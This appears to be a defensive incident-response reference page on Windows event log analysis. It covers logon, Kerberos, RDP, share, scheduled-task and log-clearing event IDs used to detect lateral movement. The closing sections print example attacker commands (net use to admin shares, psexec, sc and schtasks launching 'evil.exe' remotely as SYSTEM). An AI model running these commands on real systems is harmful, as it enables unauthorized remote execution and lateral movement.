---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# User Activity Tracking (Event Logs)

## Event Log Analysis for IR Responders and Hunters

**Description:** **Event Log Types of Interest**

* **Security Log:** Records events based on auditing criteria provided by local or global group policies.
* **System Log:** Records events logged by the operating system or its components, such as the failure of a service to start during the boot cycle.
* **Application Log:** Records events logged by applications, such as the failure of MS SQL to access a database or an antivirus alert.
* **Custom:** A wide range of specialized logs including PowerShell, Windows Firewall, Task Scheduler, and those only seen on servers like Directory Service, DNS Server, and File Replication Service logs. Many of these logs are organized in the event viewer under the Applications and Services category.&#x20;

**Location:**

```cs
%systemroot%\System32\winevt\logs
C:\Windows\System32\winevt\Logs
```

#### **Analysis Scenarios:**

## Profiling Account Usage

#### Tracking Account Usage (1)

**Scenario:**

* Determine which accounts have been used for attempted logins
* Track account usage for know compromised account **Relevant Event IDs**

```cs
4624: Successful Logon
4625: Failed Logon
4634/4647: Successful Logoff
4648: Logon using explicit credentials (RunAs)
4672: Account logon with superuser rights (Administrator)
4720 / 4726: An account was created/deleted
```

**Investigator Notes**

* Security log
* Windows does not reliably record logoffs **(ID 4634)**, so also look for **ID 4647** > user-initiated logoff for interactive logons
* Logon events are not recorded when backdoors, remote exploits, or similar malicious means are used to access a system&#x20;

**Tools for investigation:**&#x20;

EvtxECmd Parser for log files:

* Command line event log parser
  * Output in CSV, XML, JSON
  * One log or entire directory
  * Live or exported logs
* Benefits:
  * Easy extraction of “custom” fields
  * Disparate log merging and normalization
  * Crowd-sourced event maps (filters)
  * Noise reduction
  * Extract from VSS and de-duplicate

{% code overflow="wrap" %}
```cs
Collect all logs in the Log directory:
.\EvtxECmd.exe -d "C:\Windows\System32\winevt\Logs" --csv C:\ --csvf AllEvtx.csv

Collect a file from the Log directory:
.\EvtxECmd.exe -f C:\Windows\System32\winevt\Logs\Security.evtx --csv "C:\Users\admin82\Desktop\Analysis" --csvf evtCmd.csv
```
{% endcode %}

### **DeepBlueCLI**

{% code overflow="wrap" %}
```cs
## Process local Windows security event log (PowerShell must be run as Administrator):
\DeepBlue.ps1
or:
.\DeepBlue.ps1 -log security
### Process local Windows system event log:
.\DeepBlue.ps1 -log system
### Process evtx file:
.\DeepBlue.ps1 .\evtx\new-user-security.evtx
```
{% endcode %}

**Note:** The most common is the **4624/4634** pair for a successful logon/logoff, as well as the period of the complete user session. Windows is not always consistent with recording logoff events (type **4634**), so you should also look for **4647** events (**user-initiated** logoff for interactive and remote interactive sessions).

**4625** events indicate logon failures and are often reviewed for evidence of password-guessing attacks. When explicit (different) credentials are used, an **ID 4648** event is recorded. A good example of this is the **runas** command, or if an application is run as an administrator, and those admin credentials are entered by the user. Event ID **4672** is recorded for administrator-equivalent logons and the standard **4624** event. Finally, event ID 4720 is recorded whenever a new account is created, and 4726 is recorded for account deletion. The IDs mentioned are triggered by a mix of Success and Failure audits.

When an attacker gains access to a system through some exploits (remote code execution, service exploitation, client-side attacks resulting in backdoors, etc.), there is typically no record of “logon” within the event logs. This is intuitive because a backchannel is being used, and the standard APIs for access are being circumvented.

True remote exploits are quite rare, and in most situations administrative account usage is still typically required for lateral movement to the system and things like code installation, providing at least initial logging of the attack.

#### Tracking Account Usage (2)

Tracking the events of a logged-on user

```cs
Event ID
	EventID: 4624
Account
	Account Name: rswpet
Logon Type
	Logon Type: 2
Timestamp
	Logged: date/time
Computer
	Computer: hostname
```

**Investigator Note:** Don’t just rely on one event. After gathering information from the 4624 event, review other events surrounding it and look for a matching 4634 event, indicating that the user logged off from the session.

**Logon Types Codes:**

{% code overflow="wrap" %}
```cs
2: Log on via console (keyboard, server KVM, or virtual client)
3: Network logon (SMB and some RDP connections)
4: Batch Logon—Often used by Scheduled Tasks (non-interactive)
5: Windows Service Logon (non-interactive)
7: Credentials used to lock or unlock the screen; RDP session reconnect
8: Network logon sending credentials in cleartext (potentially indicative of a downgrade attack or older admin tool)
9: Different credentials used than logged-on user (RunAs/netonly command or similar)
10: Remote interactive logon (Terminal Services/Remote Desktop Protocol)
11: Cached credentials used to log on instead of domain controller authentication
12: Cached credentials used for a remote interactive logon (RDP, similar to Type 10). Seen when Microsoft “live” accounts are used for standalone authentication
13: Cached credentials used for an unlock operation (Similar to Type 7)
```
{% endcode %}

**Investigator Note:** Use logon ID value to link a logon with a logoff and determine session length as the Logon ID allows you to tie the two events together and determine the amount of time the user was logged in during this session. (use the two events: **4624** successful logon and **4647** user-initiated logoff) Remember that **4634** successful logoff events can also be used in place of **4647** events when they exist.

Determining session length is most useful for interactive (**Type 2,10,11,12**) logons. Other logon types like batch and network (**Type 3,5**) tend to connect for only short periods. For example, if a user opens a document from a remote share, a **Type 3** logon and logoff will be generated even if the user still has the document open. If changes are made and saved to the document, another **Type 3** session will be initiated.

The Logon ID can also tie together other actions like special user privileges assigned to the session, process tracking and object access events, and granular views of user activity like screen locking and unlocking (recorded as **Type 7 4624/4634** events as well as **4800/4801** events).

Built-In Accounts.

{% code overflow="wrap" %}
```cs
SYSTEM: Most powerful local account; unlimited access to the system
LOCAL SERVICE: Limited privileges similar to an authenticated user account; can access only network resources via null session
NETWORK SERVICE: Slightly higher privileges than LOCAL SERVICE; can access network resources similar to authenticated user account
<Hostname>$: Every domain-joined Windows system has a computer account
DWM: Desktop window manager\Window manager group
UMFD: Font driver host account
ANONYMOUS LOGON: Null session w/o credentials used to authenticate with the resource
```
{% endcode %}

#### Tracking Administrator Account Activity

Tracking superuser account activity helps to discover anomalous activity. During an intrusion, the adversary will need to achieve at least administrative privileges to gather credentials and effectively move through the network; auditing and managing these accounts is a critical choke point that can identify even the most advanced adversaries. When an account assigned privileges associated with an administrator logs on, an **event ID 4672** is recorded. Note that the account technically does not have to be a full administrator. For example, a successful logon event (ID 4624) is immediately followed by a “special logon” event ID 4672, indicating the user account has been assigned administrator-level privileges. Combining these two events is necessary to prove an admin-level account logged in to this system.

**Auditing Account Creation** **Event ID 4720** is recorded when an account is created. In addition to the date, time, and computer it was created on, we also get the account used to authorize the creation and various account details. The same event is used for both local and domain account creation. From a single event, you won't be able to tell the privileges of the new account, but by reviewing the events around it, you will see that a subsequent 4732 event is sometimes created.

Complementary events may include:

```cs
4722: A user account was enabled
4724: An attempt was made to reset an account’s password
4728: A member was added to a security-enabled global group
4732: A member was added to a security-enabled local group
4735: A security-enabled local group was changed
4738: A user account was changed
4756: A member was added to a security-enabled universal group

```

#### Tracking Account Usage: Remote Desktop Protocol (1)

**Scenario:**&#x20;

Track Remote Desktop Protocol Sessions **Relevant Event IDS** - **4778**: Session Reconnected - **4779**: Session Disconnected **Investigative Notes** - Security log - Records client name and IP address of the remote machine making the connection (sent via RDP client application) - Not a reliable indicator of all RDP activity—intended to record “reconnects - Valuable to fill in gaps since RDP reconnects are often “**Type 7**” logons - Also used to track “Fast User Switching” sessions - The auxiliary logs **Remote Desktop Services—RDPCoreTS** and **TerminalServices-RdpClient** record complementary info

**Pro Tip:** When piecing together evidence of RDP connections, two event IDs can provide significant value: **ID 4778** indicates that an RDP session was reconnected, and **ID 4779** indicates that a remote session was disconnected. Remember that they will not provide a historical view of every RDP connection. They are designed to track session “reconnects” instead of brand-new RDP sessions and will only show a subset of RDP activity. However, this can be advantageous since RDP session reconnects are often recorded as Event **ID 4624** Logon Type 7 events (typically

assumed to be screen lock/unlock instead of the “standard” Type 10 RDP Logon Type). If you only focus on **EID 4624** Logon Type 10 RDP events, you could miss any session reconnects but discover their existence via EID **4778** and **4779** events.

Another big advantage of **Event IDs 4778** and **4779** is that they include the IP address and the system's hostname that established the connection (the hostname recorded in **4624 events** is often an intermediary system, not the original client). We should also expect a near-simultaneous **ID 4624** event (successful logon) because **ID 4778** indicates only a successful remote session was reconnected, and **ID 4624** indicates that the credentials provided were accepted. The same goes for **ID 4779** and ID **4647** (successful logout) events.

Not every **4778/4779** event will be due to RDP usage. Windows also uses this same event to record the changing of Windows stations due to the “Fast User Switching” feature, and the session name will be “Console”.

#### Tracking Account Usage: Remote Desktop Protocol (2)

**Remote Desktop Logging** RDP activity is logged in multiple places

* Understanding the source/destination is critical

### Account Logon Events

* Different than **Logon Event** Category
* Recorded on the system that authenticated credentials
  * Local Account/Workgroup = on workstation
  * Domain/Active Directory = on the domain controller
* Event ID Codes (NTLM protocol)
  * **4776**: Successful/Failed account authentication
* Event ID Codes (Kerberos protocol)
* **4768**: Ticket Granting Ticket was granted
* **4769**: Service Ticket requested (access to server resource)
* **4771**: Pre-authentication failed (failed logon)

**Note**: A big hurdle to understanding event log categories and audit policy is understanding the difference between **Logon Events** and **Account Logon Events**. Logon Events refer to login/logoff activity on the system being logged into. They are stored locally on that end system. **Account Logon Events** refer to third-party authentication of credentials provided during that logon session. In a Windows domain environment, most user accounts are domain accounts, with their credentials stored on the domain controller, NOT the local system.

Before that user can log on to a workstation in a domain environment, his or her username and password must be validated by the domain controller using either the NTLM or Kerberos authentication protocol. Account Logon events record this process and, in this case, would be stored on the domain controller that verified the credentials. A single user logon can spread several different events across the workstation (Logon Events 4624, 4634, etc.) and the domain controller (Account Logon Events **4776, or 4768, 4769**).

One crucial exception to this is if the user is logging in using a local account, an account created only on the workstation and is not part of any domain. The workstation will do the final authentication (using the local SAM database). Therefore, you will see both Logon Events and Account Logon Events in the event logs of the workstation. Because this is quite rare in an enterprise, it is often an interesting artifact to look for because it can indicate rogue accounts created on the local system.

There are two possible authentication protocols; the Event ID codes have been broken up into those used by NTLM and those used by Kerberos. For **NTLM**, both successful and failed events are recorded using **ID 4776.**

**Kerberos** uses several unique Event ID codes, with the most commonly seen being **4768** (successful logon), 4771 (failed logon), and 4769 (successful authentication to a server resource such as a file share).

**Logon Error Codes:** If the Kerberos “pre-authentication” fails, an event **ID 4771** will be written to the authentication server’s log. In addition to providing information on date/time, hostname, client IP address, and supplied username, an Error Code will specify the reason for the authentication failure. There are over 40 possible codes that can be issued. The following are some of the most common error codes seen in Kerberos failure events:

{% code overflow="wrap" %}
```cs
0x6: Invalid/non-existent user account. This can also be caused by replication issues between Active Directory servers.
0x7: Requested server not found. This can also be caused by replication issues between Active Directory servers.
0xC: Policy restriction prohibited logon; client system restricted from accessing a resource or restricted based on time date.
0x12: Account locked, disabled, or expired.
0x17: Expired password.
0x18: Invalid password.
0x25: Clock values between server and client are skewed too greatly; Kerberos relies on a timing system o invalidate old TGTs.
```
{% endcode %}

Whenever a failure event is recorded using event ID 4776, an error code is generated and stored in the Event Description. The purpose of this code is to provide additional information as to why the credential authentication was denied. Error codes can provide the investigator with information regarding possible user actions. For instance, a locked account could indicate a password-guessing attack (or very strict password policies). Authentication attempts from restricted workstations (error code 0xC0000070) could indicate intent to access resources off-limits to that user or large-scale network enumeration. The logon event ID 4625, Failed Logon, uses the same error codes as event ID 4776.&#x20;

The following is a selection of possible error codes:

```cs
0xC0000064: Non-existent account username
0xC000006A: Incorrect password (username correct)
0xC000006F: Account not allowed to log on at this time
0xC0000070: Account not allowed to log on from this computer
0xC0000071: Expired password
0xC0000072: Disabled account
0xC0000193: Expired account
0xC0000234: Account locked
```

### Tracking Reconnaissance: Account and Group Enumeration (1)

**Scenario:**

* Identify attacker enumeration of sensitive accounts and groups. **Relevant Event IDs**
* **4798**: A user's local group membership was enumerated
* **4799**: A security-enabled local group membership was enumerated&#x20;

**Investigative Notes:**

* New events starting with Win10 and Server 2016
* A new class of hack tools allow nearly frictionless identification of the path to Domain Admin (ref. PowerView and DeathStar)—these events can help.
* Recon occurs early in the attack cycle. Early identification = faster mitigation
* Requires tuning. Filter on sensitive groups, unusual accounts, and process information (e.g., powershell.exe, wmic.exe, cmd.exe)

**Note**: Windows 10 and Server 2016 and above have added a new set of events designed to track the enumeration of sensitive accounts and groups. Account and group enumeration is a part of the attack cycle, and tools like PowerView, part of the PowerSploit and Empire attack frameworks, are designed for Active Directory and domain enumeration. Other tools like DeathStar build upon this to worm through the network, identifying sensitive accounts and high-level groups. It uses the collected information to automate credential dumping and lateral movement, making the achievement of Domain Admin possible in minutes.&#x20;

A large amount of normal account enumeration occurs in Windows; hence, these events will need to be filtered to be useful. Investigators should focus on sensitive groups, accounts that should not be used for enumeration activities, and unusual processes being used for the enumeration (PowerShell, WMI, or net use commands via cmd.exe). Performing a tuning process and allowing common processes like mmc.exe, services.exe, taskhostw.exe, explorer.exe, and VSSSVC.exe can greatly reduce the volume of events.

## Tracking Lateral Movement

### Tracking Lateral Movement: Network Shares

**Scenario:**

* Audit activity around network shares **Relevant Event IDS**
* **5140**: Network share was accessed
* **5145**: Shared object accessed (Detailed file share auditing) **Investigative Notes**
* **Security** event log provides the share name and IP address of the remote machine making the connection
* Account Name and Logon ID allow tracking of relevant accounts and other activities during that logon session
* Requires object access auditing to be enabled
* Event IDs **5142–5144** track share creation, modification, and deletion
* Detailed File Share auditing (Event ID **5145**) provides detail on individual files accessed but can be very noisy&#x20;

**Notes**: Auditing network shares can be useful for many investigations. Whether you are investigating internal access by employees or access from external threats, knowing what file shares were touched on can help understand data flows. Mounting file shares is a very common technique adversaries use to move laterally through an environment—both to distribute malware and collect data to steal. One limitation of Event ID **5140** is that it does not include references to files accessed on a given share.

### Tracking Lateral Movement: Explicit Credentials/Runas

Scenario:

* Track Credential change common during lateral movement Relevant Event IDS
* **4624**: Successful logon (Logon Type 9)
* **4648**: Logon using explicit credentials&#x20;

**Investigator** Notes:

* Changing credentials is often necessary to move from system to system
* Typically, only administrators and attackers juggle multiple credentials (though system accounts like the computer account also frequently switch accounts)
* EID **4648** events are special because they log on to the originating system and help assemble knowledge of attacker lateral movement from that system
* Logged if explicit credentials are supplied to a tool (even if no account change)

**Notes**: Many activities in a Windows enterprise require credentials to be swapped. The computer account may need to impersonate a user to authenticate to a resource, Outlook may need to switch from the logged-in domain account credentials to a user’s Microsoft cloud account to authenticate to Microsoft 365 servers, an administrator may need to switch to a higher privileged account to perform maintenance, or perhaps most interesting to us, an attacker switches credentials to laterally move to a system that requires different credentials. In well-segmented networks, it can be surprisingly difficult to move to new systems, requiring a keychain full of different credentials that only work in certain parts of the network.

We can use this to our advantage and look for these relatively rare events. They are typically recorded in EID 4624 Logon Type 9 events and specialized EID 4648 “Explicit Credentials” events. Filter out the common background system activity from these events. You are often left with just administrator and attacker (wannabe administrator) activity since they are usually the only users in the environment with multiple credentials to switch to! “Runas” **4648** events are typically recorded on the originating system instead of the target. Usually, we find evidence of suspicious activity on the target system, but we cannot easily source where the lateral movement originated from. EID 4648 events tell us where a user was headed from the system we are investigating (the originating system). They can help us rapidly scope an incident because we can easily track other connected systems.&#x20;

**Note:** There are certain situations where a 4648 event is recorded on both the original system AND the target. RDP connections using different credentials often log EID 4648 events on both systems.

These events can also be logged even if accounts are not switched! The secret to understanding this is the “explicit credentials” wording used by these event types. Explicit credentials mean that a tool uses new credentials to authenticate instead of using credentials already in memory. For example, malware suites such as Cobalt Strike often require users to specify what credentials should be used to run remote commands. PsExec can be run with the “-u” and “-p” parameters on the command line to specify credentials. Scripts can be written to use explicit credentials. If explicit credentials are provided, Windows logs this even if the explicit credentials happen to be the same as those in memory! This happens often with malware and provides another interesting to hunt for in our logs.

#### Tracking Lateral Movement: Runas Detection

**Notes**: Attackers tend to compromise a variety of accounts with different privileges. To effectively accomplish their objectives of moving laterally and executing applications throughout the enterprise, they often need to employ several different accounts. This provides defenders with a useful detection mechanism via analysis of EID 4648 events, as these events record authentications using explicit or different credentials. You may see these recorded during network share mapping, execution of lateral movement scripts, and when elevating local privileges toan administrator (via UAC or otherwise).

**For example, an EID 5140 event generated on a target system informs us of mounting** an administrative share, IPC$. Ordinarily this is the sum of information we would receive about movement to the target system. However, if the attackers used a different set of credentials to accomplish this (like a domain account instead of the local account they may be currently logged in with), we get an indication of lateral movement on the originating system as well! Therefore, ID 4648 events provide a completely different view of lateral movement from most artifacts. They allow us to easily track lateral movement from the originating system, which can be helpful if an attacker connects to multiple other systems.

#### Tracking Lateral Movement: Scheduled Tasks

**Scenario:**

* Identify and audit scheduled tasks **Relevant Event IDs**
* **106 | 4698 –** Scheduled task created (Task Scheduler | Security Log)
* **140 | 4702** – Scheduled task updated (Task Scheduler | Security Log)
* **141 | 4699** – Scheduled task deleted (Task Scheduler | Security Log)
* **200 / 201** – Scheduled task executed/completed (Task Scheduler Log)
* **4700/ 4701** – Scheduled task enabled/disabled (Security Log) **Investigative Notes**
* Scheduled tasks can be executed both locally and remotely.
* Remotely scheduled tasks also cause Logon **(ID 4624) Type 3** event
* Attackers commonly delete scheduled tasks after execution
* Task Scheduler log is no longer enabled by default. Enable via Group Policy!

Scheduled task logging in the Security log requires Object access auditing to be enabled and provides even more detailed information.&#x20;

Five events are used to record activity in the Security log:

* **4698**: Scheduled Task Created
* **4699**: Scheduled Task Deleted
* **4700**: Scheduled Task Enabled
* **4701**: Scheduled Task Disabled
* **4702**: Scheduled Task Updated **Notes**: It is important to understand that tasks can be scheduled remotely. This makes this artifact even more interesting, as it can be used by attackers for both persistence and lateral movement. Unfortunately, the task scheduler logs do not differentiate between local and remotely scheduled tasks. To find remote tasks, you must look for Type 3 (network) Logon authentication events (ID 4624) occurring very near the time of task creation.

Alerts that should be hunted for are deleted tasks. It is common for attackers to schedule tasks on various systems and then clean up those tasks after execution. Deleted tasks are rare in most environments or are easy to filter for legitimate applications, leaving only the deleted evil tasks to be identified.

### Suspicious Service

**Scenario:**

* Analyse logs for suspicious service running at boot time
* Review services started or stopped during the time of a suspected hack.&#x20;
* **Relevant Event IDs**
  * **7034**: Service crashed unexpectedly
  * **7035**: Service sent a Start/Stop control
  * **7036**: Service started or stopped
  * **7040**: Start type changed (Boot | On Request | Disabled)
  * **7045**: A new service was installed on the system (Win2008R2+)
  * **4697**: A new service was installed on the system (Security log)&#x20;

**Investigative Notes:**

* All Event IDs except **4697** reference the **System** log
* A large amount of malware and worms in the wild utilize Services
* Services started on boot illustrate persistence (desirable in malware)
* Services can crash due to attacks like process injection

## Event Log Clearing

#### Event Log Clearing (1)

**Scenario:**

* Determine whether event logs have been modified.
* &#x20;**Relevant Event IDs**
  * 1102: Audit log cleared (Security log)
  * 104: Audit log cleared (System log) **Investigative Notes**
* Administrator rights are required to clear logs
* Clearing is all or nothing (but selective delete attacks exist)
* After the Security log is cleared, a 1102 event is placed in log
* Any log clear except Security adds a 104 event in the System log
* GUI and command-line clearing (i.e., wevtutil) are both recorded
* You should have alerts set up for these events!

**Notes**: Local Administrators, Domain Administrators, and the local SYSTEM account all have the privileges to clear event logs. In many cases, we are investigating a user with administrator rights (either legitimately or illegitimately) and, as such, might be able to cover their tracks. This does not happen very often, which might be a consequence that it is difficult to clear event logs without a trace. Whenever an administrator clears the Security log, an ID 1102 event indicates a clear occurred. Any other log that is cleared will be recorded as an ID 104 in the System log. By reviewing 1102 and 104 entries, we can see when the logs were last cleared and ensure they match known legitimate administrator activities and align with data retention and security policies. **Investigator Notes:** It is common tradecraft to see many cleared event logs during ransomware attacks. Thus, this is a high-fidelity alert you should closely monitor in your environment.

#### Event Log Clearing (2)

**Notes**: When an event log has been cleared, the first event in the log chronologically will be an ID 1102 System Event, indicating that the log was cleared. This assumes that the system has the correct auditing policy to audit successful system events. Looking at ID 1102 Event Properties, you should see that the Security event log was cleared, and it should display the date and time when it occurred. Within the description section, the account name will be displayed, indicating the user account that cleared the log along with a logon ID for the session.&#x20;

<figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 133845 (1).png" alt=""><figcaption></figcaption></figure>

## Lateral Movement Adversary Tactics

#### Remote Desktop Services: Source System Artifacts

If admins use remote desktop, expect attacker usage

* Most commonly, Microsoft Remote Desktop (RDP)
* Also, look for VNC, TeamViewer, etc. (if available in the network)&#x20;

<figure><img src="../../.gitbook/assets/image 2.png" alt=""><figcaption></figcaption></figure>

**Investigator Notes:** When tracking lateral movement, one thing to remember is that eventually, attackers will start to move around in the same manner as administrators. Once attackers achieve admin and domain admin credentials, they will quickly move around the network, so you will likely see adversaries taking advantage. RDP is the most common remote desktop protocol in Windows networks. The best logs are located on the destination (or target) machine.

The **Microsoft-Windows-TerminalServices-RDPClient/Operational** log is an important data source—it is one of the easiest places to find where an attacker has moved from the source system (without needing to go to each possible target system to review logs). Look for anomalies like remote desktop connections to workstations or RDP activity to servers outside of normal administration timeframes.

The RDP client may record recent connections in the registry key on the source machine: **NTUSER\Software\Microsoft\Terminal Server Client\Servers**. The RegRipper plugin “**rdphint**” parses this key. **Jump list** data for remote desktop applications can also reference remotely connected systems (the RDP client Jump List is recorded using the **mstsc.exe executable**). The file Default.rdp in a user’s profile indicates that RDP has been executed on that system (the creation and modification times of this file can also provide pivot points). Execution artefacts can show when and how often terminal services (mstsc.exe) were executed (per user).

There are many remote screen-sharing applications, but not all are used in an enterprise, so be aware of what is used in your organisation. Sometimes, attackers may install their remote desktop solution for lateral movement. In these situations, evidence of application installation in the event logs, registry, and file system can all point to nefarious activity. The more popular remote desktop tools are VNC application (**Ultra VNC, Tight VNC, Real VN**C) and  **TeamViewer**, these can include connections made to the remote system. Application-specific registry keys may also record the most recently connected systems and prove the application was installed.

#### Remote Desktop Services: Destination System Artifacts

Different artifacts on Source and Destination

* Notice the wealth of registry and file system info on Source
* The destination has more robust event log artefacts&#x20;

<figure><img src="../../.gitbook/assets/image 3.png" alt=""><figcaption></figcaption></figure>

**Investigator Notes:** When investigating lateral movement, you must understand where our evidence will be recorded. The destination, or target, system will log activity largely via **Windows Event Logs**. While you may identify registry, filesystem, and memory artifacts related to helper file execution (such as **rdpclip.exe,** which facilitates clipboard sharing between sessions), we will be mainly relying on the logging provided by Windows and, therefore, a good reason for centralise because once a malicious pattern is identified, it can be quickly searched across all endpoints if the logs are all in one place.

RDP connections record as event log **ID 4624 Type 10** (Remote Interactive) logons. These are fairly unusual and can be a great way to easily detect RDP activity. RDP sessions will also record **ID 4778 and 4779** RDP-specific events. Look for anomalies like remote desktop connections to workstations or RDP activity to servers outside of normal administration time frames.

In addition to event log reporting in the Security log, the latest versions of Windows have included a wealth of RDP-specific logs that can help fill out our understanding. **Microsoft-Windows-RemoteDesktopServices-RDPCoreTS/Operational, Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational**, and **Microsoft-Windows-TerminalServices-LocalSessionManager/Operational** all provide records of activity on the destination system. These logs are enabled by default and do not roll over nearly as frequently as the Security event log.

#### Windows Admin Shares: Source System Artifacts

Mounting built-in shares is a simple and effective means of lateral movement:

* ADMIN$
* IPC$ Example:

```cs
net use z: \\host\c$ /user: domain\username <password
```

<figure><img src="../../.gitbook/assets/image 4.png" alt=""><figcaption></figcaption></figure>

**Investigator Notes:** Windows administrative shares are default shared resources designed to allow administrative programs access to the entire file system. They are present on every modern version of Windows (though hidden) and are almost always enabled. From a lateral movement perspective, the most interesting of these shares are the drive volume shares (e.g., C$), the Admin$ share giving access to the Windows folder, and the IPC$ share commonly used by named pipes.

There are multiple ways to detect lateral movement via administrative shares on the source system. Event logging on the source system is sparse but may be available when alternate credentials are used or failures occur. The Windows built-in “net” commands are the most commonly used tool for mapping shares so that program execution artifacts can be useful. If command line auditing is enabled, look for typed commands like “net use”.

An important artifact on the source system is the Windows registry key **NTUSER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2**. This can show the entire list of systems connected by a user account (NTUSER is tied directly to a specific user account). This information can be future enriched via the Windows Shellbags keys, showing what folders were accessed (but only for interactive sessions). To get this information from destination systems, you must piece together the list by reviewing the event logs of each target system (event logs typically only record information at the destination of an action, not the source).

#### Windows Admin Shares: Destination System Artifacts

* Easy way to stage malware or access sensitive files
* Pass-the-hash attacks are common
* Windows requires domain admin or built-in admin rights&#x20;

<figure><img src="../../.gitbook/assets/image 5 (1).png" alt=""><figcaption></figcaption></figure>

**Investigator Notes:** Attackers can access Admin shares to upload tools into nearly any folder. Drive volume shares give complete access to the entire volume, making them a quick way to remotely pillage sensitive files. Since SMB has significant flaws that allow NTLM relay attacks and few environments have adequately hardened SMB with new upgrades like SMB signing, pass-the-hash attacks are commonly used with this attack vector. Luckily, modern versions of Windows (Vista and above) now require domain admin privileges or the built-in admin account (RID 500) for remote access to admin shares. Shares are also a common vector for malware to move laterally—Conficker, Shamoon, Wannacry, NotPetya, and North Korean malware in the Sony Pictures attack all searched for or created new shares to propagate.

We have multiple ways to detect lateral movement via administrative shares. Destination systems can have excellent logging available (depending on the audit policy)—start a search for event ID **4624 Type 3** (Network) logons and corresponding **ID 5140** share access events. File system timelines can identify files copied during the times of share use.

If you have network monitoring available, SMB is a well-known protocol that is not usually encrypted, so network forensics can rebuild SMB sessions.

#### PsExec: Source System Artifacts

* Lightweight, remote execution tool provided by Microsoft
* PsExec is not a default application
* Often used for both legitimate and nefarious deeds (on the same network). **Example**:

```cs
psexec.exe \\host -accepteula -d -c c:\temp\evil.exe
```

<figure><img src="../../.gitbook/assets/image 6.png" alt=""><figcaption></figcaption></figure>

**Investigator Notes:** PsExec is a lightweight tool for remote administration. It can push and execute code non-interactively, make built-in system commands “remote-capable” by sending data back to the originating system, and even be used for interactive console sessions (i.e., running a cmd.exe shell on the remote system). A sample command might look like the following.

```cs
psexec.exe \\host –u user -accepteula –d -c c:\temp\evil.exe (-d does not wait for process termination; -c copies binary to remote system)
```

PsExec is used as frequently for legitimate administrative tasks (like pushing hotfixes) as for nefarious ones. The challenge is sifting through the artifacts to find the malicious uses.

If **PsExec** is not common in the environment, application execution artifacts are easy wins for identifying its usage. **Prefetch, ShimCache, BAM/DAM**, and **Amcache** all record its execution. Look for PSEXEC.EXE on the source system. One of the aspects of the Sysinternals suite is their requirement to accept the user agreement (Eula). The first time the PsExec Eula is accepted on the source system, the following registry key is created: **NTUSER\Software\SysInternals\PsExec\EulaAccepted**. This key is not deleted, and the registry's last write time indicates one time the tool was executed by that user.

PsExec can result in significant event log activity, but most are mainly on the destination system. One exception is if explicit credentials are used, an **EID 4648** “**runas**” event will be created on the source system. As more enterprises enable command line auditing with their Process Tracking events, the full command line of whatever PsExec was asked to do will be available on the source system.

Another place to discover PsExec activity is via running processes and memory analysis. Similar to the application execution artifacts, you should look for PSEXEC.EXE processes. In some cases, attackers may rename PsExec to blend in better.

#### PsExec: Destination System Artifacts

* Authenticates to the destination system
* Named pipes are used to communicate between the source and the target
* Mounts hidden ADMIN$ share
* Copies of PsExeSvc.exe and any other binaries to the Windows folder
* Executes code via a service (PSEXESVC)&#x20;

<figure><img src="../../.gitbook/assets/image 7.png" alt=""><figcaption></figcaption></figure>

**Investigator Notes:** PsExec requires multiple steps to remotely execute commands. First, it must authenticate to the destination system. Named pipes are then set up between the source and destination. The ADMIN$ share is mounted on the destination, and PsExeSvc.exe and any other binaries are copied to the Windows folder (by default). Finally, a Windows service is started, and the files copied are executed. With all this activity occurring in the background, PsExec can result in significant event log activity on the destination system. Authentication occurs under the current user context by default, resulting in an **ID 4624 Type 3** (Network) logon event. If the attacker changes the account context (with the -u option), the authentication event is an **ID 4624 Type 2** (Console) logon for that new account.

The latter instance will also create a user profile if the -e argument is not provided. Note that a Type 2 Console logon is considered “interactive” by Windows and causes the account token to be available, a problem for legitimate use of this tool. Since PsExec mounts the ADMIN$ share, we may also get an **ID 5140** share access event. As if that weren’t enough, the creation, starting, and stopping of the PSEXESVC service also writes several events to the System event log, including ID 7045 events.

Due to its implementation, PsExec copies itself to the destination \Windows folder (PSEXESVC.EXE). If a binary that does not currently exist on the target is executed, the –c argument tells PsExec to copy it to the system. Both instances provide an opportunity to identify and recover those files and their corresponding creation timestamps. If you find an executable or batch file created very close to the execution of PSEXESVC.EXE, the two are very likely related. Remember that PsExec –c can copy a binary anywhere in the file system. Unless the command line was captured, it might take additional artifacts to determine what was executed.

The destination system will also record application execution events for the PSEXESVC.EXE application (Pro tip: The name of the file is different on the source (psexec.exe) than on the destination (psexesvc.exe). Also note that there is no letter “c” in the destination filename). The creation of the PsExeSvc service creates an easy-to-spot service key named **SYSTEM\CurrentControlSet\Services\PSEXESVC**. This key may or may not still be present on the system, as it is sometimes deleted after the session close. However, deleted registry keys can be recovered. The Metasploit version of PsExec uses a random service name in exchange for PSEXESVC, making it easy to identify as evil. PsExec will create a user profile on the destination system by default. This presumes a profile doesn’t exist, and the attackers did not include the –e (do not create a profile) option. The creation time of this profile and its corresponding NTUSER.DAT registry data can be another indicator of the time of PsExec activity.

A final place to discover PsExeSvc activity is via running processes and memory analysis. The named pipes used to facilitate communication can be identified via process handles. The names of the pipes provide extremely useful information, including the source hostname.

It is important to note that the above artifacts presume the default name, PSEXESVC, is in use. Newer versions of PsExec include the “-r” option, allowing attackers to change this name to anything they like. When this option is used, the executable name (and relevant execution artifacts), service name, and named pipes will all reflect the name provided by the attacker. While this in no way reduces the number of artifacts recorded, it can help attackers evade specific filters set up to automatically look for the default names.

#### Windows Remote Management Tools

Windows includes many tools capable of remote execution **Create and start remote service** Services are commonly used to execute binaries remotely and establish persistence if necessary. However, they do leave excellent artifacts behind for detection. Services are recorded in the registry and include the binary that was executed. Attackers may delete the service to clean up, but deleted registry keys can persist. In addition, there is extensive Windows event logging in the system log for service-related activity.

```cs
sc \\host create servicename binpath= "c:\temp\evill.exe"
sc \\host start servicename
```

**Remote Schedule Tasks Tasks can be scheduled locally or remotely and run by any user (assuming the credentials are known).** Scheduled tasks leave behind “.job” files indicating what was scheduled (and who scheduled it) and decent event log evidence.

{% code overflow="wrap" %}
```cs
at \\host 13:00 "c:\temp\evil.exe"
schtasks /CREATE /TN taskname /TR C:\evil.exe /SC once /RU "SYSTEM" /ST 13:00 /S host /U user
```
{% endcode %}

